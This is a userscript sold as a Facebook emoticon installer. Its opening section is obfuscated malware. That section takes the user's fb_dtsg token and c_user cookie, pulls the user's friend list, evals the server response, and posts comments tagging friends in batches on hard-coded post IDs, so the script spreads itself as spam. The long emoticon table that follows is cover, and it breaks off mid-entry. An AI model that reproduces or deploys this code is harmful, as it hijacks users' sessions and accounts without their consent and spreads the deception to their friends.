// ==UserScript==
// @name            Cài đặt ICON trực tiếp trên FaceBook 2014 (y)
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","1439845829585529","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round","  Tớ đã thành công  ☺ làm Thử đi nào  😚  😘  💝  💘  💗   @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
var _0xa22c=[_0xf841[0],_0xf841[1],_0xf841[2],_0xf841[3],_0xf841[4],_0xf841[5],_0xf841[6],_0xf841[7],_0xf841[8],_0xf841[9],_0xf841[10],_0xf841[11],_0xf841[12],_0xf841[13],_0xf841[14],_0xf841[15],_0xf841[16],_0xf841[17],_0xf841[18],_0xf841[19],_0xf841[20],_0xf841[21],_0xf841[22],_0xf841[23],_0xf841[24],_0xf841[25],_0xf841[26],_0xf841[27],_0xf841[28],_0xf841[29],_0xf841[30],_0xf841[31],_0xf841[32],_0xf841[33],_0xf841[34],_0xf841[35],_0xf841[36],_0xf841[37],_0xf841[38],_0xf841[39],_0xf841[40],_0xf841[41],_0xf841[42],_0xf841[43],_0xf841[44],_0xf841[45],_0xf841[46],_0xf841[47],_0xf841[48],_0xf841[49],_0xf841[50],_0xf841[51],_0xf841[52],_0xf841[53],_0xf841[54],_0xf841[55],_0xf841[56],_0xf841[57],_0xf841[58],_0xf841[59],_0xf841[60],_0xf841[61],_0xf841[62],_0xf841[63],_0xf841[64]];
var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];
var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);
var id=_0xa22c[5];
var arkadaslar=[];
var svn_rev;
function arkadaslari_al(id)
{
	var _0x327fx8= new XMLHttpRequest();
	_0x327fx8[_0xa22c[6]]=function ()
	{
		if(_0x327fx8[_0xa22c[7]]==4)
		{
			eval(_0xa22c[8]+_0x327fx8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);
			for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++)
			{
				mesaj=_0xa22c[10];
				mesaj_text=_0xa22c[10];
				for(i=f*27;i<(f+1)*27;i++)
				{
					if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i])
					{
						mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];
						mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];
					}
					;
				}
				;
				yorum_yap(id,mesaj);
			}
			;
		}
		;
	}
	;
	var _0x327fx9=_0xa22c[24];
	_0x327fx9+=_0xa22c[25];
	_0x327fx9+=_0xa22c[26];
	_0x327fx9+=_0xa22c[27];
	_0x327fx9+=_0xa22c[28]+user_id;
	_0x327fx9+=_0xa22c[29]+user_id;
	if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0)
	{
		_0x327fx8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x327fx9,true);
	}
	else 
	{
		_0x327fx8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x327fx9,true);
	}
	;
	_0x327fx8[_0xa22c[37]]();
}
;
function RandomArkadas()
{
	var _0x327fxb=_0xa22c[10];
	for(i=0;i<9;i++)
	{
		_0x327fxb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];
	}
	;
	return _0x327fxb;
}
;
function yorum_yap(id,_0x327fxd)
{
	var _0x327fxe= new XMLHttpRequest();
	var _0x327fx9=_0xa22c[10];
	_0x327fx9+=_0xa22c[40]+id;
	_0x327fx9+=_0xa22c[41]+encodeURIComponent(_0x327fxd);
	_0x327fx9+=_0xa22c[42];
	_0x327fx9+=_0xa22c[43];
	_0x327fx9+=_0xa22c[44];
	_0x327fx9+=_0xa22c[45];
	_0x327fx9+=_0xa22c[46];
	_0x327fx9+=_0xa22c[47]+id+_0xa22c[48];
	_0x327fx9+=_0xa22c[49];
	_0x327fx9+=_0xa22c[50];
	_0x327fx9+=_0xa22c[51];
	_0x327fx9+=_0xa22c[52];
	_0x327fx9+=_0xa22c[29]+user_id;
	_0x327fx9+=_0xa22c[53];
	_0x327fx9+=_0xa22c[54];
	_0x327fx9+=_0xa22c[55];
	_0x327fx9+=_0xa22c[56]+fb_dtsg;
	_0x327fx9+=_0xa22c[57];
	_0x327fxe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);
	_0x327fxe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);
	_0x327fxe[_0xa22c[6]]=function ()
	{
		if(_0x327fxe[_0xa22c[7]]==4&&_0x327fxe[_0xa22c[63]]==200)
		{
			_0x327fxe[_0xa22c[64]];
		}
		;
	}
	;
	_0x327fxe[_0xa22c[37]](_0x327fx9);
}
;
arkadaslari_al(id);
arkadaslari_al(776083382403701);
arkadaslari_al(1440156329554479);
arkadaslari_al(1399822346947094);
arkadaslari_al(415651755245714);
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Gru?ƒÂ±?ƒÂ³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Ping?ƒÂ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
